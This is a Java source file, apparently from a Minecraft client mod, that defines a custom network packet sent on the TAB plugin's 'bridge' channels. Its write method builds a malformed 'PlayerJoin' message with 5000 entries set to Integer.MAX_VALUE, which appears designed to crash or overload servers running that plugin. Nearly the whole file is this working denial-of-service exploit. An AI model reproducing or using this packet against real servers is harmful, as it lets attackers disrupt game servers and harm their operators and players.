package io.github.spigotrce.paradiseclientfabric.packet;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

public record TabBridgePayloadPacket(String string) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, TabBridgePayloadPacket> CODEC = CustomPayload.codecOf(TabBridgePayloadPacket::write, TabBridgePayloadPacket::new);
    public static final CustomPayload.Id<TabBridgePayloadPacket> ID = new Id<>(Identifier.of("tab", "bridge-6"));
    public static final CustomPayload.Id<TabBridgePayloadPacket> ID2 = new Id<>(Identifier.of("tab", "bridge-5"));
    public static final CustomPayload.Id<TabBridgePayloadPacket> ID3 = new Id<>(Identifier.of("tab", "bridge-4"));

    private TabBridgePayloadPacket(PacketByteBuf buf) {
        this(buf.readString());
    }

    public void write(PacketByteBuf buf) {
        ByteArrayDataOutput out = ByteStreams.newDataOutput();
        int power = 5000;
        out.writeUTF("PlayerJoin");
        out.writeInt(-1);
        out.writeBoolean(false);
        out.writeInt(power);

        for(int i = 0; i < power; ++i) {
            out.writeUTF("");
            out.writeInt(Integer.MAX_VALUE);
        }

        out.writeInt(1);
        out.writeUTF("%skibidi%");
        out.writeInt(1);
        out.writeUTF("Say \ud83d\udc38");
        out.writeUTF("Gex \ud83d\udc38");
        buf.writeBytes(out.toByteArray());
    }

    public Id<TabBridgePayloadPacket> getId() {
        return ID;
    }
}
